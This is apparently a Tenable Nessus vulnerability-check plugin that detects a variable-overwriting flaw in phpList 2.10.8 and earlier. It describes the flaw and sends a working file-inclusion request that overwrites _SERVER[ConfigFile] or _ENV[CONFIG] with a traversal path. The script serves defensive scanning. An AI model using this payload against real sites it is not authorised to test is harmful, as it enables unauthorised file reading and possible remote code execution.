#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35402);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_bugtraq_id(33273);
  script_osvdb_id(51372);
  script_xref(name:"Secunia", value:"33533");

  script_name(english:"phpList <= 2.10.8 Variable Overwriting");
  script_summary(english:"Tries to read about.php");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
data modification vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of phpList installed on the remote host emulates PHP's
'register_globals' functionaltiy' insecurely in its 'admin/index.php'
script.  Provided PHP's 'register_globals' setting is disabled, an
unauthenticated attacker can exploit this issue to overwrite the
'_SERVER[ConfigFile]' and '_ENV[CONFIG]' global variables with user-
supplied input, which is then used in PHP 'include()' functions,
allowing him to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"http://www.bugreport.ir/index_60.htm");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500057");
  script_set_attribute(attribute:"see_also", value:"http://www.phplist.com/?lid=274");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?02477ec2");
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpList version 2.10.9 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/01/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tincan:phplist");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("phplist_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phplist");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_kb_item(string("www/", port, "/phplist"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to read a file.
  file = "../admin/about.php";
  url = string(dir, "/admin/index.php?_SERVER[ConfigFile]=", file);

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (res == NULL) exit(0);
	
  # If thorough_tests is enabled try to read through _ENV[CONFIG]...

  if("phplist is licensed with the" >!< res[2] && thorough_tests)
  {  
    url = string(dir, "/admin/index.php?_ENV[CONFIG]=", file);
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (res == NULL) exit(0);
  }

  # There's a problem if...
  if (
    'class="abouthead">NAME</td>' >< res[2] ||
    'phplist</a>, version VERSION' >< res[2]
  )
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to verify the issue exists using the following \n",
        "request :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
  }
}
